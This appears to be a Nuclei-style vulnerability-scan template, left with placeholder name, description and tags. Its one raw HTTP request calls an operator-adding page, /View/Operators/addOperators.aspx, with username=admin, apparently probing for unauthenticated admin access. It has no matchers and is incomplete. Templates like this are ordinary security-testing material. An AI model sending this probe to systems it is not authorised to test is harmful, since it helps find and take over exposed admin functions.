id: layun-addOperators-weak
info:
  name: Template Name
  author: apple
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |
        GET /View/Operators/addOperators.aspx?username=admin HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
